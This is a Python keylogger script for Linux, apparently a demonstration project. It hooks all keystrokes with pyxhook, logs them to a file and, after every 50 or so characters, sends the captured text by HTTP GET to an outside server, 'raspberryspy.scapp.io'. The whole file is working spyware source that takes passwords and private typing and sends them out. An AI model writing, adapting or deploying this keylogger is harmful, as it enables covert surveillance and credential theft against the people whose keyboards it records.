# Python code for keylogger 
# to be used in linux 
import os 
import pyxhook 
import requests #needed for 'GET' within function send_keys

global_string = ''

# This tells the keylogger where the log file will go.  
log_file = os.environ.get( 
	'pylogger_file', 
	os.path.expanduser('~/Desktop/file.log') 
) 

# Allow setting the cancel key from environment args, Default: ` 
cancel_key = ord( 
	os.environ.get( 
		'pylogger_cancel', 
		'`'
	)[0] 
) 

# optional: allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
	try: 
		os.remove(log_file) 
	except EnvironmentError:
		pass # File does not exist, or no permissions. 

#creating key pressing event and saving it into log file
def OnKeyPress(event): 
	global global_string
	bad_chars = ['Up','Down','Left','Right', "Shift_L", "Shift_R", "Alt_L","Alt_R",	"Control_L","Control_R"]
	with open(log_file, 'a+') as f:
		print(event)
		print("**********")
		print(chr(event.Ascii)) 		# chr() method takes a single parameter, an integer i
		if event.Key not in bad_chars:
			f.write('{}'.format(chr(event.Ascii)))
			global_string = global_string + chr(event.Ascii)
			print(len(global_string))
			print(global_string)
			if len(global_string)>50: #only 50 chars, instead of 140 for easier demonstration purposes
				send_keys(global_string)
				global_string=""
				
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 

# set the hook 
new_hook.HookKeyboard() 
try: 
	new_hook.start()		 # start the hook 
except KeyboardInterrupt: 
	# User cancelled from command line. 
	pass

def send_keys(a_string):
	URL="raspberryspy.scapp.io" #"192.168.1.4" for trial in localHost environment
	print(a_string)
	requests.get("http://"+ URL +"/in_string", params = {"key_info":a_string}) #key_info corresponds to get_string function in 'FLASK'
